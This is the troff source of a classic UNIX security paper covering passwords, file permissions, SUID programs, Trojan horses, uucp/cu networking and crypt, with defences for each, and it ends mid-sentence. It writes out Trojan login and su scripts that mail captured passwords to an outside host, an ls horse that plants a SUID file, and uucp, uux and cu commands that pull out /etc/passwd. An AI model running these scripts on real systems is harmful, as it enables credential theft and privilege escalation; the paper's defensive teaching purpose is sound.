.so ../ADM/mac
.XX security 543 "UNIX System Security"
.de DL
.IP \(em 3n
..
.TL
.UX
System Security\(dg
.AU
F. T. Grampp
.AI
.MH
.AU
R. H. Morris
.AI
.WH
.AB
Computing systems that are easy to access and that facilitate
communication with other systems are by their nature difficult
to secure.
Most often, though, the level of security that is actually
achieved is far below what it could be. 
This is due to many factors, the most important of which are
the knowledge and attitudes of the administrators and users
of such systems.
.PP
We discuss here some of the security hazards of the
.UX
system, and
suggest ways to protect against them, in the hope that an
educated community of users will lead to a level of protection
that is stronger, but far more important, which represents a
reasonable and thoughtful balance between security
and ease of use of the system.
We will not construct parallel examples for other systems,
but we encourage readers to do so for themselves.
.AE
.2C
.FS
\(dg This is a reformatted version of |reference(grampp morris bstj).
Morris is currently Chief Scientist at the NSA.
.FE
.NH
Introduction
.PP
This paper is aimed primarily at a
technical audience and for that very reason,
its usefulness
as a tutorial for increased computer
system security is diminished.
By far the most important handles to computer
security and, indeed, to information security
generally, are the following:
.DL
physical control of one's premises
and computer facilities
.DL
management commitment to security
objectives
.DL
education of employees as to what
is expected of them
.DL
the existence of administrative
procedures aimed at increased security
.PP
Unless each of these basics is in place,
all of the technical solutions, the special hardware,
the software
safeguards, and the like are utterly meaningless.
We will not address these issues to any great
extent in this paper, but we mean to stress our
firm conviction that no level of security whatever
can be achieved without them.
.PP
In discussing the status of security on the
various versions of the
.UX
system, we will
try to place our observations in a wider context
than just the
.UX
system or one particular version of the
.UX
system.
As to whether
.UX
system security is better or worse
than that of other systems, it is neither better
nor worse.
Any system that provides the same facilities as
the
.UX
system
will necessarily have similar hazards.
From its inception, the
.UX
system was designed to be
user-friendly and most decisions which pitted security
against ease of use were heavily weighted in favor
of ease of use.
The result has been that the
.UX
system has become a fertile
test bed for the development of reasonable security
procedures that interfere to the minimum possible
extent with ease of use.
.PP
The major weakness of any information system such
as the
.UX
system resides in the habits and attitudes of the
user community.
Naivete and carelessness will produce awful security
under almost any conditions.
.PP
It is easy to run a secure computer system.
You merely have to disconnect all dial-up
connections and permit only direct-wired
terminals, put the machine and its terminals
in a shielded room, and post a guard at the door.
There are in fact many examples of
.UX
systems that
are run under exactly these conditions, principally
systems that contain classified or sensitive defense
information.
.PP
There are a number of options, implemented either in
hardware or in software, that provide a measure of
security that is almost this good.
Examples are systems that only respond to a dial-up
call by calling back on a preassigned number.
Many commercially available operating systems make it
essentially impossible to create or install any
user software or application software without administrative
help; some other systems make it virtually impossible
to read files belonging to another user, even when
the users want to cooperate in their work.
All these measures 
work by restricting access to the system and by reducing
the powers that the system gives its users. The
.UX
system
was designed to increase, not decrease the power and flexibility
available to its users. It was designed to be easily
accessible and to facilitate communication within
its user community. Most
.UX
systems, not surprisingly,
are of the dialup variety.
They provide their users with a general
programming ability - to create, install,
and use their own programs.
All but a few of their files
are at least readable by anybody, and most of them have
access to thousands of other systems via remote mail and
file transfer facilities. That is, they use the
.UX
system as
its creators intended it to be used.
.PP
Such `open' systems cannot ever be made secure in any strong sense.
That is, they are unfit for applications involving classified
government information, corporate accounting,
records relating to individual privacy, and the like.
Security, though, is not an absolute matter;
there are tolerable levels of insecurity
and there are balances to be struck, not only between security
and accessibility but also between the cost of security
measures and the risk or exposure associated with
the information being protected.
By
homely analogy, most family silverware is stored in a
cabinet in a house with a lockable door. It is not
stored in a box on the front lawn for obvious reasons,
but neither is it stored in a bank vault, where it 
would be much safer than at home, but where it could
not easily be used and enjoyed. The insecurity of 
keeping it at home is both tolerable and appropriate.
(Neither of the authors, by the way, keep any silver in their homes.)
More homely yet as an example, the notion that firewood,
though a commodity of considerable value, might be
stored in a bank vault, is simply ludicrous.
The same balances are appropriate when it is information
that is being protected.
.PP
Most
.UX
systems are far less secure than they can
and should be. This unwarranted insecurity is largely
caused by complacency and by the use of concealment
as a security measure.
The administrators don't want word of gaping holes going
out the door. The bad guys agree, but for different
reasons. This attitude produces an unhealthy situation in which
administrators and users alike are uninformed about
security issues.
Much silverware is left on the lawn, and only the
bad guys are well informed about the exposure and
the risks.
.PP
Concealment is not security. The intent of this article is
to survey at least the better-known security hazards
associated with the
.UX
system, and to suggest ways in which
security can be improved without greatly
diminishing the
usefulness of the system to its authorized users.
.PP 
Topics to be covered are these:
.DL
the insecure nature of passwords
.DL
protection of files
.DL
special privileges and responsibilities of administrators
.DL
burglary tools, and protection against them
.DL
networking hazards
.DL
data encryption
.PP
All these will be discussed in the context of
a community of users who are largely naive about security
issues.
.PP
There is nothing in the above list that is specific to the
.UX
system. All of the problems that will be discussed here
are system-dependent instances of far more general problems
that appear in other forms on other systems. It is inappropriate
to construct parallel exhibits from other systems here,
but readers might find it rewarding to do this themselves.
.PP
Finally, there was more than a little trepidation about
publishing this article. There is a fine line between
helping administrators protect their systems and providing
a cookbook for creeps.
The consensus of the authors and
reviewers is that the information presented here is well-known:
the bad guys know it well, and a more favorable distribution
of this knowledge is desirable.
.NH
Password Security
.PP
The most important and usually the only barrier to the
unauthorized use of a
.UX
system is the password that
a user must utter in order to gain access to the system.
Much attention has been paid to making the
.UX
password
scheme as secure as possible against would-be
intruders |reference(morris thompson cacm).
The result is a password file in which only encrypted
passwords are kept. A person logging into the system is 
asked for a password. The password is then encrypted
with a one-way transformation,
and compared to the encrypted password
previously stored in the file.
Access
is permitted only if the two match.
An advantage of this system of password control
is that there is no record anywhere of the user's
password.
.PP
No method appears to be known to extract a user's
password from the encrypted version that is stored.
The one-way
encryption has proven to be good enough to thwart a brute-force attack.
In practice, it is easy to
write programs that are extremely successful at extracting
passwords from password files, and that are also very
economical to run. 
They operate, however, by an indirect method that
amounts to guessing
what a user's password might be, and then
trying over and over until the
correct one is found.
.PP
Such programs are commonly called `password crackers'.
They were virtually unknown five years ago, but are
widely known today. They work by encrypting a good guess
as to what a person's password might be, and comparing
this with the encrypted password in the file. Good
guesses can be made without any personal knowledge of 
the people listed in the password file, since the
file itself provides clues. Each line therein contains,
in addition to the encrypted password, the user's login 
name, home directory, login shell, and perhaps some
comments.
.PP
The most important clue is the login name. People who
are naive about security issues very often use login
names or variants thereof as passwords. For example,
if the login name is `abc', then `abc', `cba' and
`abcabc' are excellent candidates for passwords. Experiments
involving over a hundred password files have shown that
a program that uses only these three guesses requires
several minutes of minicomputer time to process a typical
password file, and can be counted on to deliver between
8 and 30 percent of the passwords in cases where neither 
users nor system administrators have been security
conscious.
.PP
Other clues can also be had from the password file.
There is a `comments' field that is used in most systems
to provide information about a user. It usually contains
things like surname, given name, address, telephone
number, project name, and so on, all of which can be
extremely rewarding to try.
.PP
Finally, if an intruder knows something about the people
using a machine, a whole new set of candidates is available.
Family and friends' names, auto registration numbers,
hobbies and pets are particularly productive categories
to try interactively in the unlikely event that a purely
mechanical scan of the password file turns out to be
disappointing.
.PP
Once the hazards are known, remedial steps can be taken
to bolster password security. The following are known to
be helpful:
.DL
Make it difficult for outsiders to obtain a copy of
a machine's password file. An intruder who is denied 
a copy of the file must resort to dialing into the
target machine and making guesses interactively via
the normal login sequence. This takes much more time
than simply running a cracker program on one's own
machine.
Actual login attempts are likely to be expensive,
and
greatly increase the chance that the intrusion attempt
will be discovered
by audit software.
There is, of course, little that
can be done to prevent a malicious insider from shipping
the file out the door;
but at least steps should be taken that an
outsider cannot use networking arrangements
to remotely cause the password file to be
shipped out.
.DL
Remove the encrypted passwords from the password file
and place them in a parallel file that is unreadable
to the general public and to networking programs like
.I uucp .
A considerate touch here is to replace the
encrypted fields in the password file with random strings of
the proper length and in the alphabet of encrypted
passwords. This has the potential for not interfering with
legitimate programs that might use the file,
and wasting large amounts of an intruder's time.
.DL
Likewise, keep the comment field elsewhere. Besides
removing useful clues, this has the benign side-effect
of shortening the password file considerably, thereby
speeding up programs like
.I ls
that search it sequentially.
.DL
Modify the
.I passwd
program to prevent users from installing
easily derivable passwords such as `abcabc'.
.DL
Educate users about bad passwords and good passwords.
One recipe for good passwords is to pick some common
word that is easily remembered but in no way associated
with its owner and then to botch it in some way so
that it will not be found in a dictionary, e.g., by
misspelling it, adding punctuation, and so on. An
alternative approach is to assign passwords to users,
rather than letting them choose their own. Both methods
have weaknesses. Left to their own ways, some people
will still use cute doggie names as passwords.
What is far more serious is that if randomly generated
passwords are assigned, most people will write them
down somewhere, often in very obvious places. The
former approach seems to be the safer.
.PP
It takes continuing ingenuity to keep up with
prevailing silly practices in choosing passwords.
Several years ago, new software was distributed
that required all new passwords to contain at least
six characters and to contain at least one
non-alphabetic character.
(In fact, it rejected both purely alphabetic and
purely numeric passwords.)
The authors made a survey of several dozen local
machines, using as trial passwords a collection of
the twenty most common female first names, each followed
by a single digit.
The total number of passwords tried was, therefore,
two hundred.
At least one of these two hundred passwords turned out to
be a valid password on every machine surveyed.
.NH
Files And File Systems
.PP
Every file in a
.UX
file system has associated with it a set
of permissions that specifies who can access the file and how.
The permissions are kept in a 9-bit field that is part of a
variable called
.I mode , 
which is part of a larger structure
called an
.I inode
that describes the file. There is a one-to-one correspondence
between files and inodes. (To simplify
matters, no distinction will be made between ordinary files,
directories and special files unless needed.)
.PP
The permission bits specify read, write and execute permissions
for the owner of the file, others in the owner's group, and
everybody else. In
.UX
software and writings about it, the
permissions field is most often presented as either a three-digit
octal number or a nine-character string. For example, 
the mode of a file that can be read, written or executed by
its owner, read and executed by members of the owner's group,
and read by everybody else would be 754 or
.CW rwxr-xr-- .
Both notations will be used here, as appropriate.
.PP
The algorithm used to determine permissions is this:
.P1 0
if(user is owner){
   if(permissions are set) it's ok
   else quit.
}
.P3
if(user is in owner's group){
   if(permissions are set) it's ok
   else quit.
}
.P3
if(permissions are set) it's ok.
.P2
.PP
Note especially that the algorithm does not look for all
possible conditions, in a hierarchical sense, in which a
user might have access to a file. This is done so that a
person can create a file whose access permissions are not
`kept in the family'. For instance, a file whose mode is
set to
007
.CW ------rwx ) (
can be read, written and executed by anyone
except its owner and members of its owner's group.
.PP
All such permission checking is bypassed if the user is
the super-user.
.PP
Two additional things must be mentioned about directories.
First, since a directory cannot be executed, the bits that
would be used to specify execute permissions are instead
used to specify search permissions, that is, the ability
to climb into a directory or to use it as a component of
a path name. Second, underlying directory
permissions can adversely affect the safety of seemingly
protected files. Suppose
.CW d 
is a directory whose mode is
730 that contains a file
.CW f 
of mode 644, that both
.CW d 
and
.CW f 
have the same owner and group, and
.CW f 
contains the text
.CW something . 
Disregarding the super-user, no one besides
the owner of
.CW f 
can change its contents, since only the
owner has write permission. Notice, though, that anyone
in the owner's group has write permission for
.CW d , 
so that
any such person can remove
.CW f 
from
.CW d 
and install a different
version:
.P1
rm d/f
echo something else >d/f
.P2
which for most purposes is the equivalent of being able to
modify
.CW f . 
Further, had
.CW f 
been a directory rather than a
file, the same person could have moved it (and all of its 
contents) elsewhere and replaced it with an entirely new
structure. Thus to ensure that a file cannot be modified,
it is necessary that
.IP \ \ \ \(bu
The file itself must be write-protected.
.IP \ \ \ \(bu
The directory containing it, and all lower directories,
must be similarly protected.
.IP \ \ \ \(bu
Group permissions must be considered. This last is especially
important if most of the users of a system are in the
same group, as is the default case on most
.UX
systems.
.LP
The mode of an existing file can be changed with the
.I chmod
command, or, from a C program,  by using the system call
of the same name. The ownership of a file is changed by using
the
.I chown
command or system call. Some versions of
.UX
restrict
.I chown 
to the super-user. Others also permit the owner of a file 
to give it away to someone else. The latter convention provides
an opportunity for fraud on systems whose users are charged 
for their disk space, but there is also a subtler problem that
will be discussed in the next section.
.PP
Finally, when a file is created, it is given the owner and
group ids of the user who created it, and a mode that corresponds to 
an argument of the creat or open system call, modified by
a user-supplied parameter called a
.I umask . 
This parameter
is also a nine-bit field, each of whose bits specifies that
the corresponding permission bit not be set, i.e., the
resulting permission field is the logical and of the file creation
mask and the one's complement of the umask.  A user's umask is set
to some default value at login time, and can subsequently be
modified by the user via the umask command or system call.
Simple prudence about accident protection suggests a default
umask of 022, which makes files unwritable except by their 
owners.
.PP
The tree of directories and files that makes up a
.UX
file
system is just a logical structure that is mapped onto a physical
device \(em a disk \(em in order to make it easy for people to
use the disk. If the physical disk can be written or read,
so can any file in the file system that resides on the disk.
All that is needed is a little knowledge and effort. It follows
then that the special files that permit access to the physical
disk should be accessible only to the super-user if file
protections are to be worth much. In practice, this rule is
usually relaxed so that the disks are writable only by the
super-user, but that they can also be read by some administrative
group.
.PP
Finally, access to programs' working storage on a machine is
available via the special files
.CW /dev/mem 
(memory) and
.CW /dev/kmem 
(kernel memory). Write permission for memory allows
a process to modify itself in any way, including giving
itself super-user privileges. Read permission allows it to
inspect things like the standard input and output of other
processes. Hence the same precautions that apply to physical
disk access apply here also.
.PP
There is more to be said about files and file systems, and
more will be said later on, after a few pitfalls have been 
dissected to provide some background.
.NH 
SUID Programs
.PP
The
.I set-userid
facility is a novel and 
useful feature in the
.UX
system|reference(ritchie setuid patent).
It allows a program
to be constructed in such a way that the userid, groupid
or both of the user who executes the program to be changed
temporarily for the duration of the program's execution.
.PP
This makes it trivially easy to write programs that would be
difficult or impossible to implement on other operating systems. 
Any user can set up a game that keeps a score file that is
normally protected from others but is open for writing and
reading to anyone who is currently playing the game. Programs
like
.I ps
that show what is going on in the system (by reading
operating system memory locations) and
.I df
that shows disk utilization (by reading
the physical disk) and
.I passwd
that lets a user write in the
password file to change a password are similarly easy to write.
.PP
Two bits in the mode of a file in which a program is kept
determine whether the program will be of the SUID variety.
These are kept in an octal digit just to the left of the
permission bits. Octal 4xxx changes the userid to that of
the program's owner. Octal 2xxx changes the group id to that of the 
owner's group.
As with
the permissions, these bits are set by chmod.
.PP
If any user of the system were free to issue the following
sequence of commands:
.P1
cp /bin/sh a.out
chmod 4777 a.out
chown root a.out
.P2
.LP
the result would be a shell that would give
super-user privileges to anyone who executed it. The danger is obvious,
and is disabled by the design of the chown and chmod commands
and system calls. The disablement takes one of two forms depending
on the version of
.UX .
.IP
If the version of
.UX
restricts chown to the superuser,
there is no problem.
.IP
If the version permits a user to give away files, chown
first knocks down the SUID bits before changing ownership.
.LP
The clear danger is taken care of, but the feature is by no means
tame. Over the years it has provided truly horrid security flaws
in various versions of the system.
Some early versions of the
.I mail
command, which ran as
super-user so as to be able to write in protected mailboxes, could
be coaxed to do things like appending lines to the password file.
Some versions of
.I login , 
when invoked after all available file
descriptors were in use, would log a user in as the super-user.
Sending a `quit' signal to a running SUID program would produce a writable SUID file
called
.CW core , 
suitable for debugging and other things. The list
is long, but the point is made: the SUID facility is a very powerful
tool, and like all powerful tools it must be handled with care.
Here are some hints about care.
.DL
SUID programs should be used only when there is no other
way to get a desired result. On most
.UX
systems, perhaps
a dozen SUID programs, excluding games, are really needed.
A lax attitude about SUID programs, combined with a `quick
and dirty' programming style, can produce disasters. As an
example, a security audit on a system on which a number of people
working on the same project had need to write in each other's files
turned up an alarming fact. The people involved knew next to
nothing about how to use groups and were too lazy to learn,
so they resorted to SUID programs instead. About 200 of these
were found. Half of these were owned by the super-user, and
most of these were writable by others, including one called
a.out whose permission field was 777. Unfortunately, such 
sloppiness is not rare.
.DL
It is difficult, when writing all but the most trivial programs,
to determine in advance that the program will be correct. Programs
sometimes do the most amazing things in unforeseen circumstances.
When designing and writing SUID programs, it is particularly
important to pay attention to simplicity of function and cleanliness
of implementation, since unexpected behavior can easily produce
security holes.
.DL
Escapes from SUID programs \(em child processes that are given
a shell \(em are highly unrecommended. If these can't be avoided,
the designer must carefully consider the consequences of inherited
files, signals, the shell's environment, and so on. 
Some systems provide a `restricted shell' whose capabilities
are somewhat less than those of the standard shell. The restrictions
are useful in reducing the accident rate among data-entry clerks
and in similar applications.
Using a restricted shell to contain an intruder is rash. Most of these are about as 
restrictive as childproof bottle caps.
.DL
SUID programs that are writable by anyone besides their owners
should be considered threatening.
.DL
System administrators should verify that the SUID programs that
are supplied with the system are clean, i.e., that the source
has not been tampered with to provide new features, and that
the binaries have been compiled from the clean source.
This last precaution is necessary but not sufficient.
Thompson|reference(thompson cacm trust) has shown that compilers can be infected
so as to modify the code that they compile, without 
leaving visible traces of the modification in any
source code, even that for the compiler. In practice, 
such compiler viruses are likely to be rare, simply
because they require much more skill and effort than
other tampering techniques.
.NH 
Trojan Horses
.PP
A favorite tool of the intruder is the Trojan horse.
As the name implies, a Trojan horse is a program that
an intruder gives to an unsuspecting user of a system.
It does what it is obviously supposed to do, but it also
quietly performs some malfeasance on behalf of the intruder.
The technique has been around for thousands of years,
and it still works splendidly. Here are some modern instances.
.PP
Ritchie|reference(ritchie security) shows a non-cryptanalytic way of finding out
passwords as follows: ``Write a program which types out
.CW login: 
on the typewriter and copies whatever is typed
to a file of your own. Then invoke the command and go away
until the victim arrives.'' At first glance, this seems
to be a case of some legitimate user of a system coveting
a neighbor's password, but in fact there are more interesting
applications. Also implied is that the horse must faithfully
simulate the non-trivial login command, which is a lot of work.
Actually, all that is needed is to simulate an unsuccessful
login attempt, as if the user had made a typing mistake, and
that is a horse of a different color:
.P1
echo -n "login: "
read X
stty -echo
echo -n "Password: "
read Y
echo ""
stty echo
echo $X $Y | mail outside!creep&
sleep 1
echo Login incorrect
stty 0 >/dev/tty
.P2
.PP
The shell script is simplicity itself, with a few kindnesses
added to make its victim feel more at home. It asks for a
login name and then a password, mails these to the bad guy,
announces failure and hangs up the phone. The user then dials
the computer, gets a real login command, carefully types
what is asked for, and goes about business as usual, unaware
of the swindle. Note that there was no requirement that the
horse be planted on the target machine, and in practice this
will likely not be the case.
.PP
Once on the target machine, the intruder can use similar horses
to acquire the privileges of other users. One of the most 
frequently used commands on
.UX
systems is
.I ls , 
which is
.UX
shorthand for ``tell me some things about these files.''
.I Ls
can be used in many contexts and with many
options, but as was the case with
.I login ,
a trivialized version
can give joy to an intruder:
.P1
>somewhere/.harmless
chmod 6777 somewhere/.harmless
sleep 2
echo "{ls: not found"
rm ls
.P2
.PP
It is placed in an executable file named
.I ls
in any writable directory that the victim will
search for commands before looking in
.CW /bin . 
When executed,
it creates a writable file called
.CW .harmless
in some far
corner of the machine, with the SUID bits turned on
in the file's permission mask. It then prints
.CW "{ls: not found" ,
erases itself, and exits.
.PP
The
.CW {
is indicative of a noisy telephone line. People are
used to it, and will automatically retype a command that gets
such a hit. When the command is retyped, the horse is gone, and
the real
.I ls
is executed. Sometime later, the intruder will
copy the shell into
.CW .harmless ,
execute it, and assume
the identity of the victim.
.PP
The most desirable identity for the intruder to assume is
that of the super-user. System administrators acquire
super-user privileges by executing a program called
.I su .
The
.I su 
command asks for the root password and bestows system-wide privileges
to those who type it correctly. A horse named
.I su , 
placed
where it will be executed by a system administrator, can
usually be relied on to send a gift within hours:
.P1
stty -echo
echo -n "Password: "
read X
echo ""
stty echo
.P3
echo $X | mail outside!creep&
sleep 1
echo Sorry.
rm su
.P2
.PP
Horses like this are easy to make and can be custom-tailored
to suit a wide variety of applications. Knowing how they
work suggests ways to defend against them:
.DL
In order for horses like
.I ls 
and
.I su 
to work, they must be
planted in places where they will be executed by their
intended victims. The operating system searches for commands
in a sequence of directories named in a string called
PATH that is associated with each user. PATH is set each
time a user logs in, and may be modified in the course of
the terminal session. Typically, it specifies the user's
current working directory, perhaps a private directory,
.CW /bin 
and
.CW /usr/bin , 
usually in that order. If the directories
that are searched prior to
.CW /bin 
are not writable by the 
intruder, the horse cannot be planted. Such protection is
most important for system administrators. A secondary level
of protection can be achieved by having peoples'
.CW .profile
files unreadable, so that an intruder is not shown the
intended victim's initial PATH setting. This turns
out to be a minor nuisance, and offers little additional protection,
as vulnerable PATH components can be deduced in other ways.
.DL
Modifying the (real)
.I su 
program so that it insists upon
being invoked by a full path name is very effective. The
change is trivial; the program needs only to check that
the first character of its 0th argument is
.CW / . 
Legitimate
users very quickly fall into the habit of typing
.CW /bin/su
rather than
.CW su 
thereby guaranteeing that the `official'
version gets executed, regardless of whether a horse is 
nearby. A further recommended change to
.I su
is that on successful
invocation it changes the PATH string so that only
.CW /bin
and
.CW /usr/bin 
will be searched for commands. This prevents
nonstandard versions of commands like
.I ls
from being executed
with super-user privileges.
.DL
There is no defense against the
.I login 
horse except user
education. Anyone who walks up to a previously unattended
terminal that says
.CW login: 
and types in the keys to the
machine is fair game.
.NH 
Networking
.PP
Several times in the previous discussion it was tacitly
assumed that files pertaining to the security of a system,
in particular the password file, might very well be 
available to an intruder who had not yet managed to
penetrate the system. It turns out that the same
communications programs that facilitate the exchange of
ideas and information among people on different machines
can, unless great care is taken, be used to subvert a
machine from a safe distance.
.PP
The
.I uucp |reference(uucp nowitz lesk v7man)
program makes it possible to copy files
from one
.UX
system to another, and is the workhorse of
.UX
networking. Indeed, the ease of information
interchange by way of
.I uucp 
and programs like
.I mail 
that
use it, accounts for much of the usefulness and popularity
of the
.UX
system. The problem with
.I uucp 
is that if
left unrestricted, it will let any outside user
execute any commands and copy out/in any file that is
readable/writable by a uucp login user. It is up to
the individual sites to be aware of this and apply the
protections that they feel are necessary|reference(latest uucp administration).
If the administrator of a site is naive or inattentive,
getting a password file from that site can be as
easy as typing
.P1 0
uucp -m target!/etc/passwd gift
.P2
to copy the remote machine's password file to a local
file called
.CW gift . 
(The
.CW -m 
option is a convenience,
not a necessity. It causes
.I uucp 
to send mail to the
intruder when the gift has arrived.) Three years ago,
this ploy was almost certain to succeed. Today, many
(but not all) systems have restrictions on which files
can be accessed and by whom. Typically, they restrict
access to a directory reserved for that purpose:
.CW /usr/spool/uucppublic .
.PP
If the direct approach is spurned,
.I uux
might be tried.
.I uux 
is a program that is part of the uucp system.
It causes execution of programs to take place on remote 
systems. Its main use \(em in practice, almost its only
use \(em is to start up the mail delivery machinery on
a remote system after
.I uucp 
has delivered the mail files
to a spooling area. Like
.I uucp 
though, it has full
generality built in, and it may be possible to successfully
execute a command like:
.P1 0
uux "target!cat </etc/passwd
	>/usr/spool/uucppublic/x"
.P2
.PP
This copies the password file to the remote machine's
spool directory, from which it can later be plucked.
Like
.I uucp ,
.I uux 
may have some restrictions, but there is
a difference: to ensure `generality', the remote system
passes the arguments of
.I uux 
to a shell for interpretation
and execution. The far end of a uucp transaction needs
only to see whether access to some file is legitimate,
but the far end of a
.I uux
transaction must examine the 
command and its context and decide whether the result
will be harmful. The latter is extremely difficult,
because the shell, like most other macro processors,
has some very complex quoting conventions deliberately
designed to hide certain types of strings until the
proper time for their expansion. An intruder with 
sufficient shell programming experience is likely to
succeed here.
.PP
Finally, given that neither
.I uucp 
nor
.I uux 
will perform
as directed, there is always the option of making a private
copy of
.I uucp . 
No special permissions are required, 
either to run the program or to access the telephone
dialers. The private copy can assert that it is calling
from anywhere, and there is no way for the called machine
to verify the claim. Thus an intruder stands a good
chance of dialing into one of a cluster of friendly
machines, masquerading as one of the family, and 
finding access permissions greatly relaxed.
.PP
Another communications program called
.I cu
is
especially appealing to intruders. The name
.I cu
stands for `call
.UX '.
It allows a user of a
.UX
system to
call another system, not necessarily
.UX ,
and to
conduct an interactive session on the remote machine.
A typical
.I cu 
session starts like this:
.P1
$ cu 5551212 
.SP	
Connected
.SP	
remote
login: user
Password:
$ [session from here until ~.]
 ...
 ...
.P2
.PP
Note the sequence of events.
.I cu 
is invoked and given
the telephone number of the remote machine. A connection
is made, and the user is asked for a login name and
a password. If these are correctly given, the session
proceeds as if the user had manually dialed in. The
session ends when the user types a line beginning
with
.CW ~ .
.PP
Consider two machines, one on which very careful attention
has been paid to security concerns, and another on which
security issues have been utterly neglected. An intruder on the 
weak machine need only install a horse \(em a version
of
.I cu 
that in addition to making connections also
copies the first few lines of a session somewhere \(em to
obtain the keys to the strong machine.
.PP
It would seem that a good rule to follow with
.I cu 
would
be never to use it to get from a weak machine to a stronger
machine, but sometimes this is not sufficient.
.I cu 
allows escape 
sequences that are not transmitted to the remote machine,
but instead cause certain useful functions to be
performed. For example, any line beginning with
.CW ~%put
tells
.I cu 
to copy a file from the local machine to the
remote; lines beginning with
.CW ~%take
cause things to go
the other way. Of special interest are lines beginning
with
.CW !
that cause commands to be executed on the 
local machine.
For example,
.P1
~!mail
.P2
lets a user read mail on the local machine while still
connected to the remote.
.PP
For some versions of
.I cu ,
the local machine cannot tell how a line was generated
when it gets it from the remote machine.
It just has a line of text. If the line says
.P1
~!mail somewhere </etc/passwd
.P2
it may have been typed deliberately by the user, it may
have been written to the user's terminal by a bad guy on
the remote machine, or it may have been contained in a
file on the remote machine that the user had been
printing. The result is the same in any case: the password
file is tossed over the wall.
.PP
The
.I ct
command causes a machine to call out to a terminal
in order to let that terminal log in to the machine.
It is otherwise identical to the
.I cu
command, but from an intruder's
point of view, the target machine gets to pay the phone bill.
This reduced cost is counterbalanced by the greatly increased risk
of getting caught by audit procedures.
.PP
Finally, there are local area networks, or LANs. These
are arrangements in which some kind of high speed
communications channel is used to connect a cluster of
machines that are geographically close to one another,
e.g., a dozen machines in the same building. The intent
of an LAN is usually not only to make it easy to share
information, but also to provide users of all the machines
in the network with handy access to resources (such
as typesetters) that are not economical to replicate
on each machine.
.PP
Unlike
.I uucp 
and
.I cu , 
which are fairly standard, LANs
come in many different flavors. It would be unkind
and not very useful to dissect some particular LAN
here, and trying to cover even the more popular ones
would require a long and mostly uninteresting book.
The hazards are exactly those of
.I uucp 
and 
.I cu : 
remote
execution, masquerading and faulty access permissions.
The forms that the attacks will take are of course
different.
.PP
Security holes in machine-to-machine communications
are well-known, and sometimes difficult to fix.
.DL
No special permissions are inherently required to
access communications devices. This makes it possible 
to obtain a private copy of a communications
program and to modify it so that it calls out
masquerading as some other machine or some other
user. Even if special privileges were required,
little would be gained, as the threat is to the
remote, as yet uncompromised machine, not the local
machine on which an intruder has presumably already
obtained the required permissions.
.DL
Given that a remote machine cannot reliably identify
its caller, allowing the remote execution of 
arbitrary commands is a sure way to invite trouble.
Remote execution of a shell is deadly, but even
an innocuous command like cat can be used to an
intruder's advantage.
.DL
The
.I uucp 
program that is used by most
.UX
machines
was not written with security in mind. It can do just
about anything, and it is up to the system administrator
to restrict its capabilities. The restrictions needed
are by no means obvious. The cure is to rewrite
.I uucp
so that it is able to deliver mail, to copy files to
and from spool directories, and to send out data only
when it has initiated the connection. We have done
this in our research environment some time ago|reference(morris try uucp).
Other efforts are in progress elsewhere|reference(uniforum uucp)|reference(truscott uucp).
.DL
The
.I cu 
program can be a security disaster. Banning it from
a machine or restricting access to devices will do
no good at all, for the obvious reasons. The best that
can be done is to educate users:
.KS
.nf
Don't \fIcu\fR from a machine that isn't trusted.
Don't \fIcu\fR to a machine that isn't trusted.
Don't browse on the remote machine.
.fi
.KE
(This advice is remarkably similar to that which parents
give their children: ``Don't go for a ride with
a stranger.'')
.DL
Local area networks should be treated as individual
machines for security purposes.
.NH
Encrypted Files
.PP
.UX
systems are distributed with a command called
.I crypt
that is used to encrypt and decrypt files|reference(morris file security).
Cleartext is supplied as input to the program. A key
(the cryptologist's term for `password') is either given  
on the command line or supplied interactively, and ciphertext
is output. The transformation performed by
.I crypt 
is its own
inverse, so that using the same key converts ciphertext to
cleartext.
.I Crypt 
is used in many applications, and often very
unwisely, as its safety depends on a very large number of
factors that are often not considered by naive users.
(For mainly this reason, Research Unix since the Eighth Edition has
kept
.I crypt
in
.CW /usr/games
rather than in
.CW /usr/bin .)
The
purpose of this section is to present those facts that ought to
be considered, so that the user can make an informed decision
about a particular application.
.PP
It is possible to decrypt an encrypted file without knowledge
of its key. This is hardly surprising, as successful methods
of attacking rotor machines have been known for over 50 years|reference(garlinski).
The job can be very time-consuming; it is not just a matter
of aiming some magic program at a file of ciphertext and
obtaining cleartext.
The method is described in detail in |reference(reeds weinberger).
The amount of work that it takes to
decrypt a file varies, depending on what clues
are available. For a file of encrypted English text,
several hours of work is not atypical.
.PP
Decryption of files can be made easy or hard, depending
on how
.I crypt 
is used:
.DL
A `one size fits all' approach to
key selection is a particularly bad idea. It goes without
saying that a user's login password, if known, will be
tried as a possible key, but there are other problems.
If ten files are encrypted with the same key, then
all ten files can be decrypted once only one is done.
Moreover, having more than one file encrypted with the
same key lets a cryptanalyst switch to a different
target when guessing at probable text gets hard.
.DL
Very frequently, a user of
.I crypt 
will forget to remove
a cleartext file after producing an encrypted version.
Such cleartext can only be described as `gold'.
.DL
Executable programs (binaries) that have not been
stripped of their predictable symbol tables are
vulnerable.
.DL
Double encryption, that is, passing text through
.I crypt
twice, makes the job of decryption harder, but not much.
.DL
Simple-minded preprocessing schemes, such as exclusive
oring the file with some constant, don't help.
.DL
Preprocessing the cleartext so that there is no longer
a one-to-one correspondence between clear- and
cipher-bytes dramatically weakens the attack. For example,
using the
.I pack
command to get a Huffman-encoded version of 
the file before passing it through
.I crypt 
ensures that
characters will cross byte boundaries, thus rendering 
byte-oriented decryption techniques useless.
.LP
Much more dangerous are the non-cryptanalytic attacks. The
techniques for guessing passwords are exactly those for guessing
keys. And a Trojan horse version of
.I crypt 
can take minutes, not
hours for an intruder to install.
.PP
Finally, the frequency distribution of the bytes in an
encrypted file is uniform. This is so unlike those of 
other files in the system that they practically scream
for the attention of an intruder. This is well worth
remembering.
.NH 
Misguided Efforts
.PP
It is one thing to clean up a system by plugging open holes,
and quite another to install security machinery that collects
evidence of possible chicanery.
The latter can be very useful or very dangerous,
depending on how it is done,
since it often happens that information that is helpful to 
system administrators can be just as helpful \(em or more so \(em to
an intruder. Here are some security tools that can help weaken
system security.
.NH 2
Logging \f4su\fP activity
.PP
The
.I su 
command allows a user to assume the identity of any other
user (the default being root, the super-user) if the password 
corresponding to the desired new identity is correctly given.
As a security measure, most implementations of
.I su 
also append
a line to a log file called
.CW sulog . 
The line contains a time stamp,
the name of the user, the proposed new identity and a flag showing
whether or not the transformation succeeded. Clearly, this file
must be protected from writing by all but the super-user.
.PP
Normally, only a small number of people on a given machine are 
supposed to have super-user privileges, and all of these should
be known to the system administrator. Thus by looking in
.CW sulog
for
those who have become
.CW root , 
the administrator
